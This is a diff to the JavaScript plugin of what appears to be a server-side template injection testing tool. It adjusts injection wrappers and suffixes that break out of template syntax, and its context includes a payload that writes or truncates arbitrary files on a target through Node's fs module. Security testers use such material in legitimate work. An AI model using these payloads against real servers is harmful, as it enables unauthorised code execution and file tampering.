@@ -21,6 +21,10 @@ class Javascript_generic(javascript.Javascript):
                 'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'render_error': {
+                # Just use the wrapped payload for eval
+                'wrapper_type': "global",
+            },
             'write': {
                 'write': """global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                 'truncate': """global.process.mainModule.require('fs').writeFileSync('{path}', '')"""
@@ -50,24 +54,24 @@ class Javascript_generic(javascript.Javascript):
             # Text context, no closures
             {'level': 0, 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "<%={code}%>"]},
             {'level': 0, 'wrappers': ["#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "\n={code}\n"]},
-            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{',
+            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{"1"',
              'closures': javascript.ctx_closures},
-            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{',
+            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{"1"',
              'closures': javascript.ctx_closures},
-            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${',
+            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${"1"',
              'closures': javascript.ctx_closures},
-            {'level': 2, 'prefix': '{closure}%>', 'wrappers': ["<%={code}>"], 'suffix': '<%=',
+            {'level': 2, 'prefix': '{closure}%>', 'wrappers': ["<%={code}%>"], 'suffix': '<%="1"',
              'closures': javascript.ctx_closures},
-            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{',
+            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{"1"',
              'closures': javascript.ctx_closures},
-            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{=',
+            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{="1"',
              'closures': javascript.ctx_closures},
-            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{=',
+            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{="1"',
              'closures': javascript.ctx_closures},
-            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n=',
+            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n="1"',
              'closures': javascript.ctx_closures},
             {'level': 3, 'prefix': '{closure}%}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}",
-                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%',
+                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%"1"',
              'closures': javascript.ctx_closures},
             # Comments
             {'level': 4, 'prefix': '*}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
